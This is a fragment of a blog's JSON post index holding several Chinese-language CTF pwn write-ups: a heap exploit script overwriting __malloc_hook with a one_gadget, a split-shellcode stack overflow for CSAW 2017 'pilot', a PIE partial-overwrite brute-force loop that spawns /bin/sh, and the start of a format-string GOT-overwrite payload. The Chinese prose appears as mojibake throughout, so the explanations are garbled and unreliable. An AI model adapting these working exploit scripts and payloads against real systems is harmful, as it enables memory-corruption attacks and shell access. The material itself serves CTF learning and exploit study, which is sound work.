u64(rc(6).ljust(8,\"\\x00\"))-0x20\nlog.info(\"heap_base:%x\"%heap_base)\nadd(0x18)#1\nchunk2_addr = heap_base+0x40\nlog.info(\"chunk2_addr:%x\"%chunk2_addr)\n\nadd(0x28) #idx2\nadd(0x28) #idx3\nadd(0x28) #idx4\n\nadd(0x28) #idx5\nadd(0x28) #idx6\nadd(0x18) #idx7\n\nadd(0x28) #idx8\nadd(0x28) #idx9\nadd(0x28) #idx10\nedit(2,\np64(0x0)+p64(0x81) #fakechunk.pre_size,fakechunk.size\n+p64(chunk2_addr+0x10)+p64(chunk2_addr+0x10) #fakechunk.fd,fakechunk.bk\n+p64(0x80)+p64(0x31)) #chunk1.pre_size, fakechunk.size = sizeof(chunka)-0x10\n#trigger off-by-null or other overflow to set chunkb.pre_inuse equals to 1;\n\n\nedit(4,p64(0x0)*4+p64(0x80)+p64(0xb0)) #chunk1.pre_size, fakechunk.size = sizeof(chunka)-0x10\n#trigger off-by-null or other overflow to set chunkb.pre_inuse equals to 1;\ndelete(5)\nadd(0x18) #5\nedit(2,\"A\"*0x10)\nshow(2)\nru(\"content: \")\nrc(0x10)\nmain_arena = u64(rc(6).ljust(8,\"\\x00\"))-88 -0x100-0x20\nmalloc_hook = main_arena-0x10\nlibc_base = malloc_hook-libc.sym['__malloc_hook']\nlog.info(\"libc_base:0x%x\"%libc_base)\nsystem_addr = libc_base + libc.sym[\"system\"] #system\nfree_hook_addr = libc_base + libc.sym[\"__free_hook\"]\nmalloc_hook_addr = libc_base +libc.sym[\"__malloc_hook\"]\ntop_addr_main = main_arena+88\none_gadget = libc_base + 0xf1247\n\n\nlog.info(\"free_hook_addr:0x%x\"%free_hook_addr)\nlog.info(\"system_addr:0x%x\"%system_addr)\nlog.info(\"main_arena:0x%x\"%main_arena)\nlog.info(\"malloc_hook_addr:0x%x\"%malloc_hook_addr)\nadd(0x28) #11\nedit(11,\"/bin/sh\\x00\")\nadd(0x28) #12\nadd(0x28) #13\nadd(0x28) #14\nadd(0x18) #15\ndelete(7)\nedit(15,p64(0x31))\nadd(0x18)#7\ndelete(4)\nedit(12,p64(main_arena))\nadd(0x28)#4\nadd(0x28)#16\nedit(16,p64(main_arena+0x30)+p64(0x0)\n+p64(0x0)*3+p64(0x31))\nadd(0x28)#17\nedit(17,p64(0x0)*3+p64(malloc_hook_addr-0x10))\npause()\nadd(0x28)#18\nadd(0x28)#19\nedit(19,p64(one_gadget))\npause()\nadd(0x28)\np.interactive()\n```\n\nå…¶å®è¿™æ¬¡æ¯”èµ›ä¹Ÿå­¦åˆ°å¾ˆå¤šï¼Œè™½ç„¶æ¯”èµ›çš„æ—¶å€™ä¸€é“é¢˜ä¹Ÿæ²¡å†™å‡ºæ¥ï¼Œæ€»çš„æ¥è¯´è¿˜æ˜¯è‡ªå·±çš„ç»éªŒå¤ªå°‘ã€‚\n\n \n","tags":["æ¯”èµ›"],"categories":["PWN"]},{"title":"CSAW Quals CTF 2017-pilot","url":"/2021/08/14/CSAW Quals CTF 2017-pilot/","content":"\n \n\n1.å¸¸è§„checkï¼Œå‘ç°è¿™ç ´ç¨‹åºå•¥ä¿æŠ¤ä¹Ÿæ²¡å¼€ï¼Œè€Œä¸”è¿˜å­˜åœ¨RWXæ®µï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191555089.jpeg)\n\nè¿™ä¸çæå˜›ã€‚ä¹‹åIDAæ‰¾æ¼æ´ï¼Œå‘ç°æ ˆæº¢å‡ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nchar buf; // [rsp+0h] [rbp-20h]\nif ( read(0, &buf, 0x40uLL) > 4 )ï¼š\n```\n\n2.è¿™é‡Œå°±å¯ä»¥æ€è€ƒä¸‹æ”»å‡»æ€è·¯ï¼Œå­˜åœ¨æ ˆæº¢å‡ºï¼Œè¿˜æœ‰RWXæ®µï¼Œè€ƒè™‘ç”¨shellcodeã€‚è™½ç„¶è¿™ä¸ªRWXæ®µæ˜¯éšæœºç”Ÿæˆçš„æ ˆï¼Œåœ°å€æ²¡åŠæ³•ç¡®å®šã€‚å†çœ‹çœ‹ç¨‹åºï¼Œå‘ç°ç¨‹åºè‡ªå·±ç»™æˆ‘ä»¬æ³„éœ²äº†bufçš„æ ˆåœ°å€ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191555043.jpeg)\n\nä¹Ÿå°±æ˜¯è¯´ç´§è·Ÿå†locationåé¢çš„æ‰“å°å‡ºæ¥çš„å°±æ˜¯bufçš„çœŸå®æ ˆåœ°å€ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ¥å—è¯¥æ ˆåœ°å€ï¼Œç„¶åç”¨æ ˆæº¢å‡ºä½¿å¾—æˆ‘ä»¬çš„mainå‡½æ•°è¿”å›æ—¶å¯ä»¥è·³è½¬åˆ°å¯¹åº”çš„bufåœ°å€ä¸Šï¼Œè€Œbufåœ°å€ä¸Šçš„å†…å®¹å°±æ˜¯æˆ‘ä»¬çš„è¾“å…¥ï¼Œä¹Ÿå°±æ˜¯è¾“å…¥çš„shellcodeï¼Œè¿™æ ·å°±å¯ä»¥æ‰§è¡Œæˆ‘ä»¬çš„shellcodeäº†ã€‚\n\n3.ä½†æ˜¯å†™å®Œshellcodeä¼šå‘ç°ç¨‹åºå´©æºƒï¼Œè¿™é‡Œè¿›å…¥IDAè°ƒè¯•ä¸€ä¸‹shellcodeã€‚å¯ä»¥å‘ç°ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ï¼ŒMainå‡½æ•°returnæ‰§è¡Œä¹‹åï¼Œè·³è½¬åˆ°shellcodeçš„åœ°æ–¹ï¼Œç„¶åè¿è¡Œshellcodeã€‚ä½†æ˜¯è¿™ä¸€è¿‡ç¨‹ä¸­ï¼Œæ ˆé¡¶æŒ‡å‘äº†mainå‡½æ•°returnçš„åœ°å€ã€‚æ‰€ä»¥åœ¨è¿è¡Œshellcodeè¿‡ç¨‹ä¸­ï¼Œç”±äºshellcodeä¸­æœ‰ä¸€ä¸ªpush rbxå‘½ä»¤ï¼Œå¯¼è‡´rspå‘ä¸Šç§»åŠ¨8ä¸ªå­—èŠ‚ä¼šè¦†ç›–æ‰shellcodeçš„é¦–åœ°å€ã€‚æœ¬æ¥è¿™æ²¡å•¥äº‹ï¼Œæ¯•ç«Ÿå·²ç»è¿›å…¥åˆ°shellcodeå½“ä¸­å»äº†ï¼Œä½†æ˜¯åé¢è¿˜æœ‰push raxå’Œpush rdiè¿™ä¸¤ä¸ªæ”¹å˜rspçš„å‘½ä»¤ï¼Œè¿™å°±å¯¼è‡´äº†rspå†æ¬¡å‘ä½åœ°å€è¦†ç›–äº†16ä¸ªå­—èŠ‚ï¼Œæ€»å…±è¦†ç›–äº†24ä¸ªå­—èŠ‚ã€‚ä½†æ˜¯æˆ‘ä»¬è¾“å…¥çš„shellcodeæœ‰48ä¸ªå­—èŠ‚ï¼Œé¡ºåºä¸ºshellcode+nop*10+addr_shellcodeï¼Œä¹Ÿå°±æ˜¯æ‰£æ‰æœ€å18ä¸ªå­—èŠ‚ï¼Œè¿˜å¤šå‡ºæ¥6ä¸ªå­—èŠ‚è¦†ç›–æ‰äº†æˆ‘ä»¬çš„æ‰§è¡Œä»£ç shellcodeçš„æœ€å6ä¸ªå­—èŠ‚ä»£ç ï¼Œå¯¼è‡´æˆ‘ä»¬çš„shellcodeæ²¡åŠæ³•å®Œå…¨æ‰§è¡Œï¼Œæœ€ç»ˆå¯¼è‡´ç¨‹åºå‡ºé”™ã€‚\n\n4.ç”±äºreadå‡½æ•°å…è®¸æˆ‘ä»¬è¾“å…¥0x40ï¼Œä¹Ÿå°±æ˜¯64ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯åœ¨è¦†ç›–æ‰è¿”å›åœ°å€ä¹‹åï¼Œæˆ‘ä»¬è¿˜èƒ½å†è¾“å…¥64-48=16ä¸ªå­—èŠ‚ã€‚ç”±äºpush rdiä¹‹åçš„ç‰‡æ®µä¸º8ä¸ªå­—èŠ‚(åŒ…æ‹¬äº†push rdi)ï¼Œå°äº16ä¸ªå­—èŠ‚ï¼Œèƒ½å¤Ÿå®¹çº³ä¸‹æˆ‘ä»¬è¢«è¦†ç›–æ‰çš„shellcodeçš„ä»£ç ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘ç”¨æ‹¼æ¥çš„æ–¹å¼æ¥æŠŠshellcodeå®Œç¾æ‰§è¡Œã€‚\n\n5.ç°åœ¨è€ƒè™‘å¦‚ä½•æŠŠä¸¤æ®µshellcodeæ±‡ç¼–ä»£ç è¿åœ¨ä¸€èµ·ã€‚æœ‰call,returnå’Œjmpï¼Œä½†æ˜¯å‰é¢ä¸¤æ¡æŒ‡ä»¤ä¸­ï¼Œcallä¼špushè¿›å‡½æ•°åœ°å€ï¼Œè€Œreturnä¹Ÿä¼šä¿®æ”¹æ ˆå’Œå¯„å­˜å™¨çš„çŠ¶æ€ï¼ŒretæŒ‡ä»¤çš„æœ¬è´¨æ˜¯pop eipï¼Œå³æŠŠå½“å‰æ ˆé¡¶çš„å†…å®¹ä½œä¸ºå†…å­˜åœ°å€è¿›è¡Œè·³è½¬ã€‚æ‰€ä»¥åªèƒ½é€‰æ‹©jmpè·³è½¬ã€‚\n\n6.å¯ä»¥æŸ¥é˜…Intelå¼€å‘è€…æ‰‹å†Œæˆ–å…¶ä»–èµ„æ–™æ‰¾åˆ°jmpå¯¹åº”çš„å­—èŠ‚ç ï¼Œæˆ–è€…è¿™ä¸ªç¨‹åºä¸­å¸¦äº†ä¸€æ¡Jmpå¯ä»¥åŠ ä»¥åˆ©ç”¨ã€‚ä¸ºEBï¼Œjmp xæ€»å…±2ä¸ªå­—èŠ‚ï¼šEB x.\n\n7.å°†ä¸¤æ®µéš”å¼€ï¼Œä»push rdiå¼€å§‹ï¼Œå°†push rdiå’Œä¹‹åçš„ä»£ç éƒ½æŒªåˆ°ä¸‹ä¸€ä¸ªåœ°æ–¹ã€‚è¿™æ—¶ç¬¬ä¸€æ®µshellcodeåº”è¯¥æ˜¯22+2(jmp x)=24ä¸ªå­—èŠ‚ï¼Œè·ç¦»ä¸‹æ®µshellcodeçš„è·ç¦»åº”è¯¥æ˜¯48-24=24ï¼Œä¹Ÿå°±å¯¹åº”0x18hï¼Œæ‰€ä»¥æ€»çš„shellcodeåº”è¯¥æ˜¯shellcode1+EB 18h+shellcode2ï¼Œè¿™æ ·å¯ä»¥é¡ºåˆ©æ‰§è¡Œéœ€è¦çš„shellcodeã€‚\n\n \n\n \n\nâ–²jmpçš„è·³è½¬è®¡ç®—è·ç¦»æ˜¯ä»jmpæŒ‡ä»¤ä¸‹ä¸€æ¡å¼€å§‹è®¡ç®—çš„ã€‚\n\nâ–²shellcodeçš„ä¸¤æ®µæ‰§è¡Œï¼š\n\n1.éœ€è¦æ³„éœ²åœ°å€ï¼Œè¯»å–æ³„éœ²åœ°å€ï¼š\n\nA.print io.recvuntil(\"Location:\")#è¯»å–åˆ°å³å°†æ³„éœ²åœ°å€çš„åœ°æ–¹ã€‚\n\nB.shellcode_address_at_stack = int(io.recv()[0:14], 16)#å°†æ³„éœ²å‡ºæ¥çš„åœ°å€è½¬æ¢ä¸ºæ•°å­—æµ\n\nC.log.info(\"Leak stack address = %x\", shellcode_address_at_stack)#å°†æ³„éœ²åœ°å€å°è¯•è¾“å‡ºï¼Œè§‚å¯Ÿæ˜¯å¦æ³„éœ²æˆåŠŸã€‚\n\n2.éœ€è¦è·³è½¬jmpå‘½ä»¤æˆ–è€…æ˜¯return/callï¼Œä½†æ˜¯returnä¼špop eipï¼Œcallä¼špush eipï¼Œéƒ½ä¼šä¿®æ”¹æ‰æ ˆä¸­çš„å†…å®¹ã€‚å¦‚æœshellcodeçš„ä¸¤æ®µæ‰§è¡Œè®¡ç®—åç§»åœ°å€çš„è¯ï¼Œå¯èƒ½éœ€è¦å°†è¿™ä¸¤ä¸ªå†…å®¹ä¹Ÿè®¡ç®—è¿›å…¥ã€‚ä½†æ˜¯jmpå°±ä¸ä¼šéœ€è¦ï¼Œæ˜¯ç›´æ¥æ— æ¡ä»¶è·³è½¬ï¼Œæ‰€ä»¥å¤§å¤šæ—¶å€™é€‰æ‹©jmpæ¯”è¾ƒå¥½ã€‚\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["shellcode"],"categories":["PWN","Shellcode0x2"]},{"title":"DefCamp CTF Finals 2016-SMS","url":"/2021/08/14/DefCamp CTF Finals 2016-SMS/","content":"\n1.å¸¸è§„checksecæ“ä½œï¼Œå¼€äº†PIEå’ŒNXï¼Œé¦–å…ˆshellcodeä¸èƒ½ç”¨ã€‚å…¶æ¬¡PIEè¡¨ç¤ºåœ°å€éšæœºåŒ–ï¼Œä¹Ÿå°±æ˜¯æ²¡åŠæ³•è¦†ç›–è¿”å›åœ°å€æ¥ç›´æ¥è·³è½¬åˆ°æˆ‘ä»¬æƒ³è¦çš„å‡½æ•°å¤„ã€‚IDAæ‰“å¼€æ‰¾æ¼æ´ï¼Œå¯ä»¥çœ‹åˆ°åœ¨domså‡½æ•°ä¸­çš„v1çš„æ ˆåœ°å€è¢«ä¼ é€’ç»™set_userå’Œset_sms\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191528555.jpeg)\n\nä¹‹åset_userä¸­ä¼šè¯»å–è¾“å…¥ä¿å­˜åœ¨Sè¿™ä¸ªæ ˆåœ°å€ä¸Šï¼Œç„¶åä»sä¸­è¯»å–å‰å››åä¸ªå­—èŠ‚åˆ°a1[140]-a1[180]ï¼Œè¿™ä¸ªa1å°±æ˜¯domså‡½æ•°ä¸­çš„v1ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191528927.jpeg)\n\nå†å¾€åçœ‹ï¼Œåœ¨set_smså‡½æ•°ä¸­ï¼ŒåŒæ ·è¯»å–1024ä¸ªå­—èŠ‚åˆ°Sè¿™ä¸ªæ ˆå˜é‡ä¸­ï¼Œå¹¶ä¸”æœ€åå°†Sçš„ç‰¹å®šé•¿åº¦strncpyç»™a1ï¼Œè¿™ä¸ªç‰¹å®šé•¿åº¦å°±æ˜¯a1[180]ã€‚æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å¯ä»¥é€šè¿‡set_useræ¥æ§åˆ¶a1[180]ï¼Œè¿›è€Œæ§åˆ¶set_smså‡½æ•°ä¸­strncpyç»™a1æ‹·è´çš„é•¿åº¦ï¼Œä¹Ÿå°±æ˜¯domså‡½æ•°ä¸­v1çš„é•¿åº¦ï¼Œä½¿å…¶å¤§äºv1è·ç¦»æ ˆåº•çš„è·ç¦»0xc0ï¼Œä»è€Œåœ¨domså‡½æ•°æ ˆä¸­æ‰§è¡Œæ ˆæº¢å‡ºï¼Œè€Œdomså‡½æ•°ä¸­çš„v1ä¹Ÿå°±æ˜¯a1ï¼Œæ˜¯åœ¨set_smsä¸­ç”±æˆ‘ä»¬è¾“å…¥åˆ°Sä¸Šçš„å†…å®¹æ‹·è´è¿‡å»çš„ï¼Œé•¿åº¦ä¸º0x400ï¼Œå®Œå…¨å¯æ§ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191527621.jpeg)\n\nå¦å¤–ç¨‹åºå­˜åœ¨åé—¨frontdoor()ï¼Œåªè¦è¿›å…¥è¿™ä¸ªå‡½æ•°ï¼Œå†è¾“å…¥binshå­—ç¬¦ä¸²å°±èƒ½getshellã€‚\n\n2.æ‰€ä»¥ç°å­˜åœ¨domså‡½æ•°æ ˆæº¢å‡ºï¼Œåé—¨å‡½æ•°è¿™ä¸¤ä¸ªæ¼æ´ï¼Œä½†æ˜¯ç”±äºPIEï¼Œåœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­æ²¡åŠæ³•ç¡®å®šfrontdoor()çš„åœ°å€ï¼Œæ— æ³•ç›´æ¥è¦†ç›–domså‡½æ•°è¿”å›åœ°å€åˆ°è¾¾åé—¨å‡½æ•°\n\n3.è¿™é‡Œå°±éœ€è¦ç”¨åˆ°å†…å­˜é¡µçš„ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œç”±äºä¸€ä¸ªå†…å­˜é¡µçš„å¤§å°ä¸º0x1000ï¼Œè€Œfrontdoor()å‡½æ•°å’Œdosmså‡½æ•°å’Œmainå‡½æ•°ç­‰ç­‰å‡½æ•°ï¼Œéƒ½åœ¨åŒä¸€ä¸ªå†…å­˜é¡µä¸Šï¼Œæ‰€ä»¥åœ¨64ä½ç¨‹åºä¸‹ä»–ä»¬çš„å‡½æ•°åœ°å€éƒ½æ˜¯0x############x***è¿™ç§ç±»å‹ï¼Œå‰é¢12ä½#æ¯æ¬¡åŠ è½½éƒ½ä¸ä¸€æ ·ï¼Œè€Œåé¢çš„ä¸‰ä½***ä¸ä¼šå‘ç”Ÿæ”¹å˜ï¼Œå› ä¸ºéƒ½åœ¨0x0000563cc913(x)000 - 0x0000563cc913(x+1)000è¿™ä¸ªå†…å­˜é¡µä¸Šã€‚ç”¨IDAæ‰“å¼€æŒ‰ctrl+så¯ä»¥çœ‹åˆ°\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191527058.png)\n\nè¿™äº›æ®µéƒ½åœ¨0x0000563cc913(x)000 - 0x0000563cc913(x+1)000è¿™ä¸ªå†…å­˜é¡µä¸Šã€‚è€Œå¼€å¯äº†PIEç¨‹åºçš„ï¼Œ0000563cc913(x)è¿™ä¸ªæ•°å€¼æ¯æ¬¡éƒ½ä¼šå˜åŒ–ï¼Œä½†æ˜¯æœ€åä¸‰ä½æ˜¯ä¸ä¼šæ”¹å˜çš„ï¼Œå°±æ˜¯å›ºå®šç›¸å¯¹äºè¿™ä¸ªå†…å­˜é¡µèµ·å§‹ä½ç½®çš„åç§»ã€‚\n\n4.æ‰€ä»¥è¦†ç›–è¿”å›åœ°å€æ—¶ï¼Œå¯ä»¥æƒ³åˆ°ï¼Œdosmså‡½æ•°çš„è¿”å›åœ°å€æ˜¯call dosmsä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œä¹Ÿå°±æ˜¯åœ¨mainå‡½æ•°ä¸Šï¼Œè€Œfrontdoorå‡½æ•°çš„åœ°å€ä¸mainå‡½æ•°çš„åœ°å€éƒ½åœ¨0x0000563cc913(x)è¿™ä¸ªå†…å­˜é¡µä¸Šã€‚æ‰€ä»¥å½“ç¨‹åºè¢«åŠ è½½ï¼Œ0x0000563cc913(x)è¿™ä¸ªæ•°å€¼å‘ç”Ÿæ”¹å˜æ—¶ï¼Œfrontdoorå‡½æ•°å’Œmainå‡½æ•°åœ°å€ä¸­å¯¹åº”çš„æ•°å€¼ä¹Ÿä¼šç›¸åº”æ”¹å˜ï¼Œè€Œä¸”éƒ½æ˜¯ä¸€æ ·çš„ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œå°±å¯ä»¥é€šè¿‡ä¿®æ”¹dosmsè¿”å›åœ°å€çš„åå››ä½ï¼Œä¹Ÿå°±æ˜¯ä¹‹å‰çš„(x)yyyæ¥è·³è½¬åˆ°frontdoorã€‚\n\n5.å¦‚æœç›´æ¥çˆ†ç ´ï¼ŒæŒ‰ç…§æ•°å­¦æœŸæœ›éœ€è¦å°è¯•0xffff+1=65535+1è¿™ä¹ˆå¤šæ¬¡ï¼Œå¤ªå·¨å¤§ã€‚è¿™é‡Œåˆè€ƒè™‘åˆ°yyyæ—¶ä¸ä¼šæ”¹å˜çš„ï¼Œæ‰€ä»¥ç”¨IDAå¯ä»¥çœ‹åˆ°frontdoorå‡½æ•°çš„åä¸‰ä½åœ°å€ä¸º900ï¼Œæˆ‘ä»¬åœ¨å†™payloadçš„æ—¶å€™ç›´æ¥å†™å…¥å³å¯ï¼Œå°±æ˜¯PIEä¹Ÿä¸ä¼šå‘ç”Ÿæ”¹å˜ã€‚ç°åœ¨å”¯ä¸€ä¸ç¡®å®šçš„å°±æ˜¯(x)yyyä¸­çš„xã€‚ç›´æ¥çˆ†ç ´å°±å¥½ï¼Œå¹³å‡å°è¯•çš„æ•°å­¦æœŸæœ›ä¸ºf+1=16æ¬¡ï¼Œä¹Ÿä¸ç®—å¤ªé«˜ã€‚\n\n6.æ‰€ä»¥å°è¯•å†™payload:\n\n(1)ä¿®æ”¹set_userä¸­çš„a1[180]çš„å€¼ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ndef setlength():\n    io.recvuntil('> ')\n    payload_setlength = 'a'*40 #padding\n    payload_setlength += '\\xca' \n    io.sendline(payload_setlength)\n```\n\n(2)æ‰§è¡Œæ ˆæº¢å‡ºï¼Œè¦†ç›–è¿”å›åœ°å€çš„ä½ä¸¤ä¸ªå­—èŠ‚ä¸º\"\\x(x)9\"å’Œ\"\\x01\"(å¤§ç«¯åºï¼Œæ³¨æ„é¡ºåº)\n\n```\n#æ³¨é‡Šå¤´\n\ndef StackOverflow():\n    io.recvuntil('> ')\n    payload_StackOverflow = 'a'*200 #padding\n    payload_StackOverflow += '\\x01\\xa9' \n    #frontdoorçš„åœ°å€åä¸‰ä½æ˜¯0x900, +1è·³è¿‡push rbpï¼Œå½±å“\n    io.sendline(payload_StackOverflow)\n```\n\nè¿™é‡Œè·³è¿‡push rbpçš„åŸå› æ˜¯å› ä¸ºstrncpyçš„å…³ç³»ï¼Œå¦‚æœå‘é€çš„æ˜¯\\x00,\\xa9ï¼Œé‚£ä¹ˆå…ˆå¤åˆ¶\\x00ï¼Œåˆ™ä¼šç”±äºstrncpyçš„æœºåˆ¶æå‰ç»“æŸå¤åˆ¶ï¼Œé€ æˆa9æ²¡åŠæ³•å¤åˆ¶è¿›å»ï¼Œä»è€Œç¨‹åºå‡ºé”™ã€‚(å‘é€çš„ç”±äºæ˜¯fgetå‡½æ•°ï¼Œæ‰€ä»¥ä¼šå…¨ç›˜æ¥å—ï¼Œ\\x00ä¹Ÿä¼šæ¥å—ï¼Œä¸æ˜¯è¯»å–å‡½æ•°çš„åŸå› ã€‚)è€Œè·³è¿‡push rbpå¹¶ä¸å½±å“frontdooré‡Œé¢çš„å‡½æ•°æ‰§è¡Œï¼Œæ‰€ä»¥ä¸ä¼šå½±å“getshellã€‚\n\n(3)ç”±äºæ¯æ¬¡åœ°å€éšæœºï¼Œæ‰€ä»¥åœ°å€éšæœºæˆa900çš„æ¦‚ç‡ä¸º1/16ï¼Œé‚£ä¹ˆå°±è€ƒè™‘ç”¨è‡ªåŠ¨åŒ–æ¥çˆ†ç ´å®æ–½ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ni = 0\nwhile True:\n    i += 1\n    print i\n    io.remote(\"127.0.0.1\",0000)\n    setlength()\n    StackOverflow()\n    try:\n        io.recv(timeout = 1) \n        #è¦ä¹ˆå´©æºƒè¦ä¹ˆçˆ†ç ´æˆåŠŸï¼Œè‹¥å´©æºƒioä¼šå…³é—­ï¼Œio.recv()ä¼šè§¦å‘   EOFError\n    except EOFError:\n        io.close()\n        continue\n    else:\n        sleep(0.1)\n        io.sendline('/bin/sh\\x00')\n        sleep(0.1)\n        io.interactive() #æ²¡æœ‰EOFErrorçš„è¯å°±æ˜¯çˆ†ç ´æˆåŠŸï¼Œå¯ä»¥å¼€shell\n        break\n```\n\nâ–²å¦‚æœç›´æ¥processæœ¬åœ°åˆ™æ²¡åŠæ³•æˆåŠŸè¿è¡Œï¼Œéœ€è¦ç”¨socatè½¬å‘ï¼Œç”¨127.0.0.1æœ¬åœ°è¿æ¥æ‰å¯ä»¥ã€‚\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["PIE"],"categories":["PWN","PIE0x7"]},{"title":"Format_x86å’Œformat_x64","url":"/2021/08/14/Format_x86å’Œformat_x64/","content":"\nâ˜…32ä½ç¨‹åºï¼š\n\n1.å¸¸è§„checksecï¼Œåªå¼€äº†NXã€‚æ‰“å¼€IDAæŸ¥æ¼æ´ï¼Œmainå‡½æ•°ä¸­æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nmemset(&buf, 0, 0x12Cu);\nread(0, &buf, 0x12Bu);\nprintf(&buf);\n```\n\n2.è¿™é‡Œä¼šæœ‰ä¸€ä¸ªé‡å¤è¯»å–çš„å¾ªç¯ï¼Œå¼€shelléœ€è¦systemå‡½æ•°å’Œbinshå­—ç¬¦ä¸²ï¼Œè¿™é‡Œåªæœ‰systemå‡½æ•°ï¼Œgotå’Œpltéƒ½å¯¹åº”æœ‰ï¼Œæ²¡æœ‰binshå­—ç¬¦ä¸²ï¼Œæ²¡æœ‰libcã€‚\n\n3.ç”±äºprintfæ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´å‘æŒ‡å®šçš„å†…å­˜åœ°å€å†™å…¥æŒ‡å®šçš„å†…å®¹ï¼Œè¿™é‡Œè€ƒè™‘å°†printfçš„gotä¸­çš„å€¼æ›´æ”¹systemå‡½æ•°pltè¡¨é¡¹çš„å€¼ã€‚åŸæœ¬å¦‚æœè°ƒç”¨printfå‡½æ•°ï¼Œåˆ™ç›¸å½“äºæ‰§è¡Œprintfå‡½æ•°çš„gotè¡¨ä¸­ä¿å­˜çš„printfå‡½æ•°çš„çœŸå®åœ°å€å¤„çš„ä»£ç ï¼Œæ›´æ”¹ä¹‹åç›¸å½“äºæ‰§è¡Œsystemå‡½æ•°pltè¡¨åœ°å€å¤„çš„ä»£ç ï¼Œä¹Ÿå°±ç›¸å½“äºè°ƒç”¨systemå‡½æ•°ã€‚åŸç†å¦‚ä¸‹ï¼š\n\nåŸæœ¬æ‰§è¡ŒPrintfå‡½æ•°ï¼šç›¸å½“äºæ‰§è¡Œprintfçš„æ‰§è¡Œä»£ç \n\n```\n#æ³¨é‡Šå¤´\n\nprintf_got_addr:   7Fxxxxxx\n7Fxxxxxx:          printfçš„æ‰§è¡Œä»£ç \n```\n\næ›´æ”¹ä¹‹åï¼šç›¸å½“äºæ‰§è¡Œjmp system_gotä»£ç ï¼Œé‚£å°±ç›¸å½“äºæ‰§è¡Œsystemå‡½æ•°äº†\n\n```\n#æ³¨é‡Šå¤´\n\nprintf_got_addr:          08048320(system_plt)\n08048320(system_plt):     jmp system_got\n```\n\n4.é‚£ä¹ˆé¢„æƒ³ç¨‹åºæ€»æµç¨‹å¦‚ä¸‹ï¼šç¬¬ä¸€æ¬¡è¯»å–ï¼Œè¾“å…¥payloadï¼Œç„¶åprintfæ‰§è¡Œï¼Œå°†printfçš„gotè¡¨æ›´æ”¹ä¸ºsystemå‡½æ•°pltè¡¨ã€‚é€šè¿‡whileå¾ªç¯ï¼Œç¬¬äºŒæ¬¡è¯»å–ï¼Œè¾“å…¥binshå­—ç¬¦å­˜å…¥bufä¸­ï¼Œæ­¤æ—¶printf(&buf)ï¼Œç›¸å½“äºsystem(&buf)ï¼Œé‚£å°±ç›¸å½“äºsystem(binsh)ï¼Œå³å¯ç›´æ¥getshellã€‚\n\n5.ç¼–å†™payloadï¼Œé¦–å…ˆéœ€è¦è®¡ç®—ä¸€ä¸‹åç§»åœ°å€ï¼Œå°†æ–­ç‚¹ä¸‹åœ¨call printfä¸Šï¼Œé€šè¿‡è°ƒè¯•èƒ½å¤ŸæŸ¥çœ‹åˆ°printfå†™å…¥æ ˆä¸­çš„åœ°å€è·ç¦»espçš„åç§»é‡ä¸º6ï¼Œæ‰€ä»¥ä½¿ç”¨æ§åˆ¶å­—ç¬¦%næ¥å°†printfåŠ«æŒåˆ°systemï¼Œè¿™é‡Œåç§»å°±ä¼šæˆn-1ä¸º5ã€‚åç§»ä»£è¡¨çš„æ˜¯å–å‚æ•°çš„æ—¶å€™çš„åç§»é‡ï¼Œä¸‹é¢çš„payloadå¯¹åº”çš„5ï¼Œ6ï¼Œ7ï¼Œ8å°±å¯¹åº”å‘åœ°å€print_gotï¼Œprint_got+1ï¼Œprint_got+2ï¼Œprint_got+3å†™å…¥å†…å®¹ã€‚ç”±äºæ˜¯ä¿®æ”¹åœ°å€ï¼Œæ‰€ä»¥ç”¨%hhnæ¥é€ä¸ªä¿®æ”¹ï¼Œé˜²æ­¢å‘æœåŠ¡å™¨å‘é€è¿‡å¤§æ•°æ®ä»è€Œå‡ºé”™ã€‚\n\n(1)æ‰¾åˆ°gotè¡¨å’Œpltè¡¨é¡¹çš„å€¼\n\n```\n#æ³¨é‡Šå¤´\n\nprintf_got = 0x08049778\nsystem_plt = 0x08048320\n```\n\n(2)32ä½ç¨‹åºï¼Œ4ä¸ªå­—èŠ‚ä¸€ä¸ªåœ°å€ï¼Œæ‰€ä»¥éœ€è¦å››ä¸ªåœ°å€ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\npayload = p32(printf_got)\npayload += p32(printf_got+1)\npayload += p32(printf_got+2)\npayload += p32(printf_got+3)\n```\n\n(3)ç”±äºæ˜¯å¤§ç«¯åºï¼Œä½åœ°å€ä¿å­˜çš„æ˜¯é«˜åœ°å€çš„å†…å®¹ï¼Œprint_gotéœ€è¦ä¿å­˜çš„åº”è¯¥æ˜¯system_pltçš„æœ€åä¸€ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯0x20ã€‚\n\nâ‘ 